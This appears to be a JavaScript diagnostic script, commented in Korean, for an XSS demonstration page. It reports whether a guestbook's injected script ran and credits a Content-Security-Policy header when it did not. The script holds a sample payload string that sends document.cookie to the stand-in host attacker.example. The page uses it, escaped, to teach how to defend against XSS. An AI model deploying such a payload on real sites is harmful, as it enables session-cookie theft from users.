// 진단 스크립트 (외부 파일 · 같은 출처 'self' → CSP default-src 'self' 에서도 허용)
//  - 방명록 글에 삽입된 인라인 스크립트가 실제로 실행됐는지(window.__xssRan) 판정.
//  - 실행됨(취약)  → 공격자 글이 스크립트를 실행해 쿠키 탈취/변조. 🚨 증표.
//  - 차단됨(조치)  → 삽입된 스크립트가 CSP로 실행 안 됨(텍스트로만 남음). ✅ 증표.
// 방명록 게시글 날짜 → 촬영 시점(new Date, = collector 캡처 순간) 기준 최근 날짜로 갱신.
//  데모 콘텐츠를 덜 낡아 보이게 하는 표시용일 뿐, 증적의 촬영 시각(대상 응답 Date 헤더)과는 별개.
;(function () {
  var pad = function (n) { return (n < 10 ? '0' : '') + n }
  var daysAgo = function (n) {
    var d = new Date()
    d.setDate(d.getDate() - n)
    return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate())
  }
  var offsets = [8, 7, 2] // 김철수, 이영희, 공격자 글(가장 최근)
  var dates = document.querySelectorAll('.p-date')
  for (var i = 0; i < dates.length; i++) {
    if (offsets[i] != null) dates[i].textContent = daysAgo(offsets[i])
  }
})()

;(function () {
  var ran = !!window.__xssRan
  var body = document.getElementById('attacker-body')
  var v = document.getElementById('verdict')
  var payload = "<script>new Image().src='//attacker.example/steal?c='+document.cookie</" + 'script>'
  var esc = function (s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') }

  if (ran) {
    // 취약: 공격자 글의 스크립트가 실행되어 방명록을 변조하고 쿠키를 탈취
    if (body) body.innerHTML = '<span class="hacked">🚨 삽입된 스크립트가 <b>실행됨</b> → 세션 쿠키 탈취·외부 전송: <code>' + esc(window.__stolenCookie || '') + '</code></span>'
    if (v) {
      v.className = 'verdict verdict-vuln'
      v.innerHTML =
        '<div class="v-chip">🚨 취약</div>' +
        '<div class="v-body">' +
          '<b>어디가:</b> 방명록이 입력값을 <b>이스케이프 없이</b> 출력 + 응답에 <code>Content-Security-Policy</code> 없음.<br>' +
          '<b>어떻게:</b> 공격자 글에 삽입된 인라인 &lt;script&gt;가 브라우저에서 실행 → 위 방명록 글이 변조되고 세션 쿠키가 유출됩니다.' +
        '</div>'
    }
  } else {
    // 조치: 삽입된 스크립트가 실행되지 않고 '평범한 무해한 글(텍스트)'로만 남음
    if (body) {
      body.className = 'p-body safe-comment'
      body.innerHTML = esc(payload) +
        '<div class="safe-tag">✅ 실행 안 됨 · 무해한 텍스트로만 저장됨 (스크립트가 동작하지 않음)</div>'
    }
    if (v) {
      v.className = 'verdict verdict-safe'
      v.innerHTML =
        '<div class="v-chip">✅ 조치됨</div>' +
        '<div class="v-body">' +
          "<b>어디가:</b> 응답 헤더에 <code>Content-Security-Policy: default-src 'self'</code> 적용됨.<br>" +
          '<b>어떻게:</b> 같은 글이 방명록에 올라와도 브라우저가 인라인 &lt;script&gt; 실행을 차단 → 쿠키 접근·변조 없이 텍스트로만 남습니다.' +
        '</div>'
    }
  }
})()
